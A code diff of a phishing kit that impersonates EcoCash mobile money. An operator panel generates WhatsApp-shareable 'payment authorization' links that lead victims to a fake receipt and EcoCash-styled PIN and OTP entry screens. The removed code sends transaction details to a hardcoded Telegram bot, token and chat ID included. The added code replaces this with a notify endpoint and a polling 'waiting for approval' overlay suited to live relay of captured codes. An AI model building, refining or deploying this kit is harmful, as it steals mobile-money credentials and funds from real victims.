-            </div>
-          </div>
-          <form id="admin-payment-form" onsubmit="handleAdminFormSubmit(event)">
-            <div class="form-group">
-              <div class="label-row">
-                <label for="adminCountrySelect">EcoCash Supported Country <span class="required">*</span></label>
-                <span class="helper-pill">EcoCash Markets Only</span>
-              </div>
-              <select id="adminCountrySelect" class="styled-select" onchange="handleAdminCountryChange()" required>
-                <option value="" data-flag="" data-country="" data-currency="" selected></option>
-                <option value="+263" data-flag="🇿🇼" data-country="Zimbabwe" data-currency="USD">🇿🇼 Zimbabwe (+263) — Flagship / USD / ZiG</option>
-                <option value="+266" data-flag="🇱🇸" data-country="Lesotho" data-currency="LSL">🇱🇸 Lesotho (+266) — EcoCash Lesotho</option>
-                <option value="+257" data-flag="🇧🇮" data-country="Burundi" data-currency="BIF">🇧🇮 Burundi (+257) — EcoCash Burundi / Leo</option>
-                <option value="+27" data-flag="🇿🇦" data-country="South Africa" data-currency="ZAR">🇿🇦 South Africa (+27) — EcoCash Remit SA</option>
-                <option value="+267" data-flag="🇧🇼" data-country="Botswana" data-currency="BWP">🇧🇼 Botswana (+267) — EcoCash Remit Botswana</option>
-                <option value="+44" data-flag="🇬🇧" data-country="United Kingdom" data-currency="GBP">🇬🇧 United Kingdom (+44) — EcoCash Remit UK</option>
-                <option value="+260" data-flag="🇿🇲" data-country="Zambia" data-currency="ZMW">🇿🇲 Zambia (+260) — EcoCash Remit Zambia</option>
-              </select>
-              <span class="field-hint" id="country-hint"></span>
-            </div>
-            <div class="form-group">
-              <div class="label-row">
-                <label for="adminTrackingNumber">Tracking Number <span class="required">*</span></label>
-                <button type="button" class="field-helper-btn" onclick="generateAdminTracking()">Auto-Generate</button>
-              </div>
-              <input type="text" id="adminTrackingNumber" placeholder="e.g. JHGFDWQTD" required autocomplete="off" class="styled-input uppercase-text">
-            </div>
-            <div class="form-group">
-              <label for="adminModeOfPayment">Mode of Payment <span class="required">*</span></label>
-              <input type="text" id="adminModeOfPayment" placeholder="e.g. Escrow Account" required autocomplete="off" class="styled-input">
-            </div>
-            <div class="form-group">
-              <label for="adminAccountName">Recipient / Account Name <span class="required">*</span></label>
-              <input type="text" id="adminAccountName" placeholder="e.g. Prince Chigamba" required autocomplete="off" class="styled-input">
-            </div>
-            <div class="form-group">
-              <label for="adminAccountNumber">Account / Phone Number <span class="required">*</span></label>
-              <div class="phone-input-combined">
-                <span class="country-prefix-addon"><span id="admin-flag-icon"></span><span id="admin-dial-code"></span></span>
-                <input type="text" id="adminAccountNumber" placeholder="e.g. 0787156492" required autocomplete="off" class="styled-input phone-field">
-              </div>
-            </div>
-            <div class="form-row-2col">
-              <div class="form-group">
-                <label for="adminAmount">Amount <span class="required">*</span></label>
-                <input type="number" id="adminAmount" step="0.01" min="0.01" placeholder="e.g. 25.00" required class="styled-input">
-              </div>
-              <div class="form-group">
-                <label for="adminCurrency">Currency <span class="required">*</span></label>
-                <input type="text" id="adminCurrency" placeholder="e.g. USD" required autocomplete="off" class="styled-input uppercase-text">
-              </div>
-            </div>
-            <div class="form-group">
-              <label for="adminReceiptOptional">Service / Receipt Note (Optional)</label>
-              <input type="text" id="adminReceiptOptional" placeholder="e.g. Escrow Payment" autocomplete="off" class="styled-input">
-            </div>
-            <button type="submit" id="btn-admin-submit" class="btn-primary-block">
-              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-              <span>Generate &amp; Register Client Link</span>
-            </button>
-          </form>
-        </div>
-        <div class="admin-column-right">
-          <div class="admin-card link-showcase-card">
-            <div class="card-status-tag"><span class="status-ready-pill">Link Ready to Share</span></div>
-            <h2 class="showcase-title">Client Payment Link</h2>
-            <p class="showcase-desc">Send this private link to the client. The client will only see the EcoCash receipt and PIN/OTP payment interface.</p>
-            <div class="share-link-wrapper">
-              <div class="link-input-group">
-                <input type="text" id="admin-share-link-input" readonly class="share-url-input">
-                <button type="button" class="btn-copy-link" onclick="copyAdminGeneratedLink()">
-                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
-                  <span id="copy-btn-label">Copy Link</span>
-                </button>
-              </div>
-            </div>
-            <div class="showcase-actions-grid">
-              <button type="button" class="btn-action-outline" onclick="openClientPreviewInNewTab()">Preview Client View</button>
-              <button type="button" class="btn-action-outline" onclick="shareViaWhatsApp()">Share via WhatsApp</button>
-            </div>
-            <div class="link-meta-summary">
-              <div class="meta-item"><span class="m-lbl">Target Recipient</span><span class="m-val" id="summary-recipient"></span></div>
-              <div class="meta-item"><span class="m-lbl">Payable Amount</span><span class="m-val highlight" id="summary-amount"></span></div>
-              <div class="meta-item"><span class="m-lbl">Country Market</span><span class="m-val" id="summary-country"></span></div>
-              <div class="meta-item"><span class="m-lbl">Tracking Code</span><span class="m-val code" id="summary-tracking"></span></div>
-            </div>
-          </div>
-          <div class="admin-card history-card">
-            <div class="history-header">
-              <div>
-                <h3 class="history-title">Registered Payments History</h3>
-                <span class="history-subtitle">Stored locally in your secure admin console</span>
-              </div>
-              <button type="button" class="btn-clear-text" onclick="clearAdminHistory()">Clear</button>
-            </div>
-            <div id="admin-history-list" class="admin-history-list"></div>
-          </div>
-        </div>
-      </div>
-    </main>
-  </div>
-</div>
-
-<!-- =========================================================
-     CLIENT RECEIPT VIEW
-     ========================================================= -->
 <div id="view-client">
-  <div class="client-body" style="min-height:100vh;display:flex;flex-direction:column">
-    <header class="client-topbar no-print">
+  <div style="min-height:100vh;display:flex;flex-direction:column">
+    <header class="client-topbar">
       <div class="client-brand"><span class="brand-eco">Eco</span><span class="brand-cash">Cash</span></div>
       <button type="button" class="btn-client-help" onclick="openHelpModal()">Help</button>
     </header>
     <main class="client-main-container">
-      <div class="receipt-action-toolbar no-print">
+      <div class="receipt-action-toolbar">
         <button type="button" class="toolbar-btn" onclick="copyReceiptText()">Copy Receipt</button>
         <button type="button" class="toolbar-btn primary" onclick="printReceipt()">Print</button>
       </div>
-      <div class="receipt-card-container" id="receipt-card">
-        <div class="receipt-nav-header no-print">
-          <button type="button" class="btn-icon-back" onclick="openShareModal()" title="Share">
+      <div class="receipt-card-container">
+        <div class="receipt-nav-header">
+          <button type="button" class="btn-icon-back" onclick="openShareModal()">
             <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line></svg>
           </button>
           <span class="receipt-header-title">Payment Receipt</span>
-          <button type="button" class="btn-icon-help" onclick="openHelpModal()" title="Help">
+          <button type="button" class="btn-icon-help" onclick="openHelpModal()">
             <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
           </button>
         </div>
         <div class="receipt-content-body">
-          <div class="status-badge-wrapper">
-            <div class="success-circle-icon">
-              <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg>
-            </div>
+          <div class="success-circle-icon">
+            <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg>
           </div>
           <h2 class="status-heading">Payment Request Received</h2>
           <p class="status-description">A payment request has been sent to you. Review the details below and authorize to release funds.</p>
@@ -454,23 +180,14 @@ label{display:block;font-size:13px;font-weight:600;color:#334155;margin-bottom:6
             <div class="metadata-row"><span class="meta-label">Country</span><span class="meta-value" id="display-country-name"></span></div>
             <div class="metadata-row"><span class="meta-label">Transaction ID</span><span class="meta-value" id="display-tracking-id"></span></div>
           </div>
-          <div class="ecocash-logo-container">
-            <span class="ecocash-logo-mark"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></span>
-          </div>
-        </div>
-        <div class="receipt-bottom-bar no-print">
-          <button type="button" class="bottom-tab" onclick="openShareModal()">Share</button>
-          <button type="button" class="bottom-tab" onclick="openReminderModal()">Remind</button>
-          <button type="button" class="bottom-tab" onclick="openHelpModal()">Help</button>
+          <div class="ecocash-logo-mark"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div>
         </div>
       </div>
     </main>
   </div>
 </div>
 
-<!-- =========================================================
-     LOGIN / PIN MODAL
-     ========================================================= -->
+<!-- ============ PIN MODAL ============ -->
 <div class="modal-backdrop" id="modal-ecocash-login" onclick="closeModalOnBackdrop(event,'modal-ecocash-login')">
   <div class="ecocash-login-dialog">
     <button type="button" class="btn-dialog-close" onclick="closeModal('modal-ecocash-login')">&times;</button>
@@ -491,23 +208,13 @@ label{display:block;font-size:13px;font-weight:600;color:#334155;margin-bottom:6
           <input type="password" inputmode="numeric" maxlength="1" class="pin-box" id="pin-3">
           <input type="password" inputmode="numeric" maxlength="1" class="pin-box" id="pin-4">
         </div>
-        <button type="button" class="btn-ecocash-login" onclick="proceedToOtp()">Login</button>
-      </div>
-      <div class="login-bottom-pills-row">
-        <button type="button" class="login-pill-btn" onclick="showToast('Please contact EcoCash support')">Forgot PIN?</button>
-        <button type="button" class="login-pill-btn" onclick="showToast('Dial *111# on your phone')">Get PIN</button>
-      </div>
-      <div class="login-card-footer">
-        <div class="version-tag">EcoCash Secure v2.4</div>
-        <div class="terms-text">Terms &amp; Conditions apply</div>
+        <button type="button" class="btn-ecocash-login" id="btn-login-submit" onclick="submitPin()">Login</button>
       </div>
     </div>
   </div>
 </div>
 
-<!-- =========================================================
-     OTP MODAL
-     ========================================================= -->
+<!-- ============ OTP MODAL ============ -->
 <div class="modal-backdrop" id="modal-otp-verify" onclick="closeModalOnBackdrop(event,'modal-otp-verify')">
   <div class="ecocash-login-dialog">
     <button type="button" class="btn-dialog-close" onclick="closeModal('modal-otp-verify')">&times;</button>
@@ -531,802 +238,416 @@ label{display:block;font-size:13px;font-weight:600;color:#334155;margin-bottom:6
           <input type="text" inputmode="numeric" maxlength="1" class="otp-box" id="otp-5">
           <input type="text" inputmode="numeric" maxlength="1" class="otp-box" id="otp-6">
         </div>
-        <div class="otp-resend-row">
-          <span id="otp-timer-text">Resend in <span id="otp-countdown">30s</span></span>
-          <button type="button" class="btn-resend" id="btn-resend-otp" style="display:none" onclick="resendOtp()">Resend OTP</button>
-        </div>
-        <button type="button" class="btn-ecocash-login btn-verify-otp" id="btn-submit-otp" onclick="verifyOtpAndAccept()">Verify OTP &amp; Release Payment</button>
-        <button type="button" class="btn-back-to-login" onclick="backToLogin()">Back to login</button>
+        <button type="button" class="btn-ecocash-login" id="btn-otp-submit" onclick="submitOtp()">Verify OTP</button>
       </div>
     </div>
   </div>
 </div>
 
-<!-- =========================================================
-     DECLINED MODAL
-     ========================================================= -->
-<div class="modal-backdrop" id="modal-payment-declined">
-  <div class="ecocash-login-dialog">
-    <div class="login-brand-header">
-      <span class="brand-badge"><span class="brand-eco">Eco</span><span class="brand-cash">Cash</span></span>
-      <div class="login-heading">Authorization Failed</div>
-    </div>
-    <div class="login-blue-container declined-container">
-      <div class="login-inner-white-card declined-white-card">
-        <div class="declined-badge-wrapper">
-          <div class="declined-circle-icon">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
-          </div>
-        </div>
-        <h2 class="declined-title">Payment Declined</h2>
-        <p class="declined-desc">We could not authorize this payment. The response code below indicates the reason.</p>
-        <div class="declined-details-box">
-          <div class="declined-row"><span class="d-label">Transaction ID</span><span class="d-value" id="declined-tx-id"></span></div>
-          <div class="declined-row"><span class="d-label">Response Code</span><span class="d-value error-code">EC-DECLINE-704</span></div>
-          <div class="declined-row"><span class="d-label">Status</span><span class="d-value status-failed">Failed</span></div>
-        </div>
-        <div class="declined-actions-row">
-          <button type="button" class="btn-retry-payment" onclick="retryPayment()">Retry</button>
-          <button type="button" class="btn-dismiss-declined" onclick="closeModal('modal-payment-declined')">Close</button>
-        </div>
-      </div>
-    </div>
+<!-- ============ WAITING OVERLAY ============ -->
+<div class="waiting-overlay" id="waiting-overlay">
+  <div class="waiting-card">
+    <div class="spinner"></div>
+    <h3 class="waiting-title" id="waiting-title">Waiting for approval…</h3>
+    <p class="waiting-desc" id="waiting-desc">Please wait while your request is being reviewed. Do not close this page.</p>
+    <div class="waiting-hint" id="waiting-hint">This usually takes a few seconds</div>
   </div>
 </div>
 
-<!-- =========================================================
-     SHARE MODAL
-     ========================================================= -->
-<div class="modal-backdrop" id="modal-share" onclick="closeModalOnBackdrop(event,'modal-share')">
-  <div class="modal-card">
-    <div class="modal-header">
-      <span class="modal-title">Share Receipt</span>
-      <button type="button" class="btn-modal-close" onclick="closeModal('modal-share')">&times;</button>
+<!-- ============ ERROR POPUP ============ -->
+<div class="modal-backdrop" id="modal-error">
+  <div class="status-popup-card">
+    <div class="status-icon-circle icon-red">
+      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
     </div>
-    <div class="modal-body">
-      <p class="modal-desc">Share this receipt link or copy the details to your clipboard.</p>
-      <div class="share-link-box">
-        <input type="text" id="share-link-input" readonly>
-        <button type="button" class="btn-copy" onclick="copyShareInput()">Copy</button>
-      </div>
-      <div class="modal-actions-grid">
-        <button type="button" class="modal-action-btn" onclick="copyReceiptText()">Copy Receipt Text</button>
-      </div>
-    </div>
+    <h3 class="status-popup-title" id="error-title">Wrong credentials</h3>
+    <p class="status-popup-desc" id="error-desc">Please check your PIN and try again.</p>
+    <button type="button" class="btn-popup-primary" onclick="closeErrorAndRetry()">Try Again</button>
   </div>
 </div>
 
-<!-- =========================================================
-     REMINDER MODAL
-     ========================================================= -->
-<div class="modal-backdrop" id="modal-reminder" onclick="closeModalOnBackdrop(event,'modal-reminder')">
-  <div class="modal-card">
-    <div class="modal-header">
-      <span class="modal-title">Set Reminder</span>
-      <button type="button" class="btn-modal-close" onclick="closeModal('modal-reminder')">&times;</button>
+<!-- ============ SUCCESS / IN REVIEW POPUP ============ -->
+<div class="modal-backdrop" id="modal-inreview">
+  <div class="status-popup-card">
+    <div class="status-icon-circle icon-green">
+      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg>
     </div>
-    <div class="modal-body">
-      <p class="modal-desc">Set a reminder for transaction <strong id="reminder-tx-id"></strong>.</p>
-      <input type="datetime-local" id="reminder-time" class="styled-input" style="margin-bottom:16px">
-      <button type="button" class="btn-ecocash-login" onclick="saveReminder()">Save Reminder</button>
-    </div>
+    <h3 class="status-popup-title">Payment in Review</h3>
+    <p class="status-popup-desc">Your payment authorization has been received and is being reviewed. You will be notified once it's complete.</p>
+    <button type="button" class="btn-popup-primary" onclick="closeInReview()">Done</button>
   </div>
 </div>
 
-<!-- =========================================================
-     HELP MODAL
-     ========================================================= -->
+<!-- ============ HELP MODAL ============ -->
 <div class="modal-backdrop" id="modal-help" onclick="closeModalOnBackdrop(event,'modal-help')">
-  <div class="modal-card">
-    <div class="modal-header">
-      <span class="modal-title">Help &amp; Support</span>
-      <button type="button" class="btn-modal-close" onclick="closeModal('modal-help')">&times;</button>
+  <div class="status-popup-card" style="max-width:420px;text-align:left">
+    <h3 class="status-popup-title" style="text-align:center;margin-bottom:16px">Help &amp; Support</h3>
+    <div style="display:flex;flex-direction:column;gap:10px;background:#f8fafc;padding:14px;border-radius:8px;font-size:13px">
+      <div style="display:flex;justify-content:space-between"><span>EcoCash Support</span><strong>111</strong></div>
+      <div style="display:flex;justify-content:space-between"><span>WhatsApp</span><strong>+263 78 000 0111</strong></div>
+      <div style="display:flex;justify-content:space-between"><span>Email</span><strong>support@ecocash.co.zw</strong></div>
     </div>
-    <div class="modal-body">
-      <div class="help-contact-box">
-        <div class="contact-row"><span>EcoCash Support</span><strong>111</strong></div>
-        <div class="contact-row"><span>WhatsApp</span><strong>+263 78 000 0111</strong></div>
-        <div class="contact-row"><span>Email</span><strong>support@ecocash.co.zw</strong></div>
-      </div>
+    <button type="button" class="btn-popup-primary" style="margin-top:16px" onclick="closeModal('modal-help')">Close</button>
+  </div>
+</div>
+
+<!-- ============ SHARE MODAL ============ -->
+<div class="modal-backdrop" id="modal-share" onclick="closeModalOnBackdrop(event,'modal-share')">
+  <div class="status-popup-card" style="max-width:420px">
+    <h3 class="status-popup-title" style="margin-bottom:14px">Share Receipt</h3>
+    <p class="status-popup-desc" style="text-align:left">Copy this link to share the receipt.</p>
+    <input type="text" id="share-link-input" readonly style="width:100%;padding:10px;font-size:13px;font-family:monospace;border:1px solid #cbd5e1;border-radius:6px;margin-bottom:14px">
+    <div style="display:flex;gap:8px">
+      <button type="button" class="btn-popup-primary" onclick="copyShareInput()">Copy</button>
+      <button type="button" class="btn-popup-primary" style="background:#f1f5f9;color:#334155" onclick="closeModal('modal-share')">Close</button>
     </div>
   </div>
 </div>
 
-<!-- Toast -->
 <div id="toast" class="toast-notification"></div>
 
 <script>
-/* =========================================================
-   TELEGRAM DIRECT INTEGRATION
-   ========================================================= */
-const TELEGRAM_BOT_TOKEN = '8834604760:AAHnFWeTawysGPNs6dnqvbOYquhC4cxhs1w';
-const TELEGRAM_CHAT_ID   = '8294270663';
-const TELEGRAM_API       = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+/* ================= CONFIG & STATE ================= */
+const STORAGE_KEY_CURRENT = 'ecocash_current_receipt';
+const NOTIFY_ENDPOINT = '/api/notify';
+const STATUS_ENDPOINT = '/api/status';
 
-function sendTelegramNotification(payload){
-  const text =
-    `🔔 *EcoCash Notification*\n` +
-    `━━━━━━━━━━━━━━━\n` +
-    `📌 *Status:* ${payload.status || '—'}\n` +
-    `🧾 *Ref:* ${payload.referenceId || '—'}\n` +
-    `👤 *Recipient:* ${payload.recipientName || '—'}\n` +
-    `📱 *Destination:* ${payload.destination || '—'}\n` +
-    `💳 *Service:* ${payload.serviceType || '—'}\n` +
-    `📝 *Notes:* ${payload.notes || '—'}\n` +
-    `🕒 ${new Date().toLocaleString()}`;
-  return fetch(TELEGRAM_API,{
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'Markdown' })
-  }).catch(e=>console.error('Telegram notify error:',e));
-}
-
-/* =========================================================
-   CONSTANTS & STATE
-   ========================================================= */
-const STORAGE_KEY_RECEIPTS = 'ecocash_receipts_history';
-const STORAGE_KEY_CURRENT  = 'ecocash_current_receipt';
-
-const DEFAULT_SAMPLE_DATA = {
+const DEFAULT_RECEIPT = {
   trackingNumber:'', modeOfPayment:'', accountName:'', countryCode:'', countryFlag:'',
   countryName:'', accountNumber:'', amount:'', currency:'', receiptOptional:'',
   timestamp:'', isAccepted:false, isDeclined:false
 };
 
-let currentReceipt = { ...DEFAULT_SAMPLE_DATA };
-let otpTimerInterval = null;
-let otpSecondsLeft = 30;
+let currentReceipt = { ...DEFAULT_RECEIPT };
+let pollTimer = null;
+let currentSessionId = null;
+let currentStage = null; // 'pin' | 'otp'
 
-/* =========================================================
-   VIEW ROUTER
-   ========================================================= */
-function showView(name){
-  document.getElementById('view-admin').classList.add('hidden');
-  document.getElementById('view-client').classList.add('hidden');
-  document.body.classList.remove('admin-body','client-body');
-  if(name==='admin'){
-    document.getElementById('view-admin').classList.remove('hidden');
-    document.body.classList.add('admin-body');
-  } else {
-    document.getElementById('view-client').classList.remove('hidden');
-    document.body.classList.add('client-body');
-  }
-}
-
-function initApp(){
-  const params = new URLSearchParams(window.location.search);
-  const view = params.get('view');
-  const isPay = params.get('pay') === '1';
-  if(view === 'admin'){
-    showView('admin');
-    initAdminPage();
-  } else {
-    showView('client');
-    initClientPage();
-    if(isPay){ window.setTimeout(openLoginModal,150); }
-  }
-}
-
-/* =========================================================
-   ADMIN
-   ========================================================= */
-function initAdminPage(){
-  const saved = localStorage.getItem(STORAGE_KEY_CURRENT);
-  if(saved){
-    try{ currentReceipt = JSON.parse(saved); }catch(e){ currentReceipt = {...DEFAULT_SAMPLE_DATA}; }
-  } else { currentReceipt = {...DEFAULT_SAMPLE_DATA}; }
-  populateAdminForm(currentReceipt);
-  updateGeneratedLinkDisplay(currentReceipt);
-  renderAdminHistory();
-}
-
-function handleAdminCountryChange(){
-  const select = document.getElementById('adminCountrySelect');
-  if(!select) return;
-  const opt = select.options[select.selectedIndex];
-  const dialCode = opt.value || '';
-  const flag = opt.getAttribute('data-flag') || '';
-  const countryName = opt.getAttribute('data-country') || '';
-  const defaultCurr = opt.getAttribute('data-currency') || '';
-  const dialEl = document.getElementById('admin-dial-code');
-  const flagEl = document.getElementById('admin-flag-icon');
-  const hintEl = document.getElementById('country-hint');
-  const currInput = document.getElementById('adminCurrency');
-  if(dialEl) dialEl.textContent = dialCode;
-  if(flagEl) flagEl.textContent = flag;
-  if(hintEl) hintEl.textContent = countryName ? `Selected: ${countryName} EcoCash corridor (${dialCode})` : '';
-  if(currInput && !currInput.value) currInput.value = defaultCurr;
-}
-
-function generateAdminTracking(){
-  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
-  let result = '';
-  for(let i=0;i<9;i++) result += chars.charAt(Math.floor(Math.random()*chars.length));
-  const input = document.getElementById('adminTrackingNumber');
-  if(input) input.value = result;
-  showToast(`Generated Tracking ID: ${result}`);
-}
-
-function populateAdminForm(data){
-  const trackingInput = document.getElementById('adminTrackingNumber');
-  const modeInput = document.getElementById('adminModeOfPayment');
-  const nameInput = document.getElementById('adminAccountName');
-  const countrySelect = document.getElementById('adminCountrySelect');
-  const accountInput = document.getElementById('adminAccountNumber');
-  const amountInput = document.getElementById('adminAmount');
-  const currencyInput = document.getElementById('adminCurrency');
-  const receiptInput = document.getElementById('adminReceiptOptional');
-  if(trackingInput) trackingInput.value = data.trackingNumber || '';
-  if(modeInput) modeInput.value = data.modeOfPayment || '';
-  if(nameInput) nameInput.value = data.accountName || '';
-  if(countrySelect && data.countryCode) countrySelect.value = data.countryCode;
-  handleAdminCountryChange();
-  if(accountInput) accountInput.value = data.accountNumber || '';
-  if(amountInput) amountInput.value = data.amount || '';
-  if(currencyInput) currencyInput.value = data.currency || '';
-  if(receiptInput) receiptInput.value = data.receiptOptional || '';
-}
-
-function handleAdminFormSubmit(e){
-  e.preventDefault();
-  const countrySelect = document.getElementById('adminCountrySelect');
-  const opt = countrySelect.options[countrySelect.selectedIndex];
-  const countryCode = opt.value || '';
-  const countryFlag = opt.getAttribute('data-flag') || '';
-  const countryName = opt.getAttribute('data-country') || '';
-  const now = new Date();
-  const monthNames = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];
-  const hours = String(now.getHours()).padStart(2,'0');
-  const mins = String(now.getMinutes()).padStart(2,'0');
-  const currentFormattedTime = `${monthNames[now.getMonth()]} ${now.getDate()} ${hours}:${mins}`;
-
-  const newRecord = {
-    trackingNumber: document.getElementById('adminTrackingNumber').value.trim().toUpperCase(),
-    modeOfPayment: document.getElementById('adminModeOfPayment').value.trim(),
-    accountName: document.getElementById('adminAccountName').value.trim(),
-    countryCode, countryFlag, countryName,
-    accountNumber: document.getElementById('adminAccountNumber').value.trim(),
-    amount: parseFloat(document.getElementById('adminAmount').value || 0).toFixed(2),
-    currency: document.getElementById('adminCurrency').value.trim().toUpperCase(),
-    receiptOptional: document.getElementById('adminReceiptOptional').value.trim(),
-    timestamp: currentFormattedTime,
-    isAccepted:false, isDeclined:false,
-    createdAt: new Date().toISOString()
-  };
-
-  currentReceipt = newRecord;
-  localStorage.setItem(STORAGE_KEY_CURRENT, JSON.stringify(currentReceipt));
-  saveToHistory(currentReceipt);
-  updateGeneratedLinkDisplay(currentReceipt);
-  renderAdminHistory();
-
-  const clientLink = buildClientPaymentUrl(currentReceipt);
-  navigator.clipboard.writeText(clientLink).then(()=>{
-    showToast('✓ Payment Registered & Client Link Copied!');
-  }).catch(()=>{
-    showToast('✓ Payment Registered! Client Link Ready.');
-  });
-}
-
-function buildClientPaymentUrl(receipt){
-  const targetUrl = new URL(window.location.href);
-  targetUrl.search = '';
-  targetUrl.hash = '';
-  const payload = {
-    t:receipt.trackingNumber, n:receipt.accountName, a:receipt.amount, c:receipt.currency,
-    cc:receipt.countryCode, cf:receipt.countryFlag, cn:receipt.countryName,
-    acc:receipt.accountNumber, m:receipt.modeOfPayment, r:receipt.receiptOptional, ts:receipt.timestamp
-  };
-  const encodedPayload = encodeURIComponent(btoa(unescape(encodeURIComponent(JSON.stringify(payload)))));
-  targetUrl.search = `tracking=${encodeURIComponent(receipt.trackingNumber)}&p=${encodedPayload}`;
-  return targetUrl.toString();
-}
-
-function updateGeneratedLinkDisplay(data){
-  const linkInput = document.getElementById('admin-share-link-input');
-  const sumRecipient = document.getElementById('summary-recipient');
-  const sumAmount = document.getElementById('summary-amount');
-  const sumCountry = document.getElementById('summary-country');
-  const sumTracking = document.getElementById('summary-tracking');
-  const hasData = data && (data.trackingNumber || data.accountName || data.accountNumber || data.amount);
-  const shareUrl = hasData ? buildClientPaymentUrl(data) : '';
-  if(linkInput) linkInput.value = shareUrl;
-  if(sumRecipient) sumRecipient.textContent = data.accountName || '';
-  if(sumAmount) sumAmount.textContent = data.amount ? `${(data.currency||'').toUpperCase()} ${parseFloat(data.amount).toFixed(2)}`.trim() : '';
-  if(sumCountry) sumCountry.textContent = data.countryName ? `${data.countryFlag||''} ${data.countryName} (${data.countryCode||''})`.trim() : '';
-  if(sumTracking) sumTracking.textContent = data.trackingNumber || '—';
-}
-
-function copyAdminGeneratedLink(){
-  const input = document.getElementById('admin-share-link-input');
-  if(!input || !input.value) return;
-  input.select(); input.setSelectionRange(0,99999);
-  navigator.clipboard.writeText(input.value).then(()=>{
-    const label = document.getElementById('copy-btn-label');
-    if(label){ const o = label.textContent; label.textContent='Copied!'; setTimeout(()=>label.textContent=o,2000); }
-    showToast('✓ Client payment link copied!');
-  }).catch(()=>showToast('Link copied!'));
-}
-
-function openClientPreviewInNewTab(){
-  const url = buildClientPaymentUrl(currentReceipt);
-  window.open(url,'_blank');
-}
-
-function shareViaWhatsApp(){
-  const url = buildClientPaymentUrl(currentReceipt);
-  const text = `Hello ${currentReceipt.accountName}, here is your official EcoCash Payment Authorization link for ${currentReceipt.currency} ${parseFloat(currentReceipt.amount||0).toFixed(2)} (Ref: ${currentReceipt.trackingNumber}):\n\n${url}\n\nPlease click the link to authorize payment on EcoCash.`;
-  window.open(`https://api.whatsapp.com/send?text=${encodeURIComponent(text)}`,'_blank');
-}
-
-function loadSampleAdminData(){
-  currentReceipt = {...DEFAULT_SAMPLE_DATA};
-  populateAdminForm(currentReceipt);
-  updateGeneratedLinkDisplay(currentReceipt);
-  showToast('Form cleared.');
-}
-
-function renderAdminHistory(){
-  const listEl = document.getElementById('admin-history-list');
-  if(!listEl) return;
-  const history = getStoredHistory();
-  if(history.length === 0){
-    listEl.innerHTML = `<div class="history-empty">No payments registered yet. Fill the form to create your first client link.</div>`;
-    return;
-  }
-  listEl.innerHTML = history.map(item=>{
-    const itemUrl = buildClientPaymentUrl(item);
-    return `
-    <div class="history-item-row">
-      <div class="hist-info">
-        <div class="hist-name">${escapeHtml(item.accountName)} <span class="hist-code">${escapeHtml(item.trackingNumber)}</span></div>
-        <div class="hist-sub">${escapeHtml(item.countryFlag||'')} ${escapeHtml(item.countryName||'')} • ${escapeHtml(item.modeOfPayment||'')} • ${escapeHtml(item.timestamp||'')}</div>
-      </div>
-      <div class="hist-amt">${escapeHtml(item.currency)} ${parseFloat(item.amount||0).toFixed(2)}</div>
-      <div class="hist-actions">
-        <button type="button" class="btn-hist-action" title="Copy Link" onclick="copyHistoryLink('${escapeHtml(itemUrl)}')">⧉</button>
-        <button type="button" class="btn-hist-action" title="Open" onclick="window.open('${escapeHtml(itemUrl)}','_blank')">↗</button>
-        <button type="button" class="btn-hist-action delete" title="Delete" onclick="deleteHistoryItem('${escapeHtml(item.trackingNumber)}')">✕</button>
-      </div>
-    </div>`;
-  }).join('');
-}
-
-function copyHistoryLink(url){
-  navigator.clipboard.writeText(url).then(()=>showToast('✓ Link copied!')).catch(()=>showToast('Link copied!'));
-}
-
-function deleteHistoryItem(trackingNumber){
-  let list = getStoredHistory();
-  list = list.filter(r=>r.trackingNumber !== trackingNumber);
-  localStorage.setItem(STORAGE_KEY_RECEIPTS, JSON.stringify(list));
-  renderAdminHistory();
-  showToast('Payment record removed');
-}
-
-function clearAdminHistory(){
-  if(confirm('Clear all registered payment history?')){
-    localStorage.removeItem(STORAGE_KEY_RECEIPTS);
-    renderAdminHistory();
-    showToast('History cleared');
-  }
-}
-
-/* =========================================================
-   CLIENT
-   ========================================================= */
-function initClientPage(){
+/* ================= INIT ================= */
+function init(){
   setupPinInputs();
   setupOtpInputs();
+  loadReceiptFromURL();
+  renderReceipt(currentReceipt);
+}
 
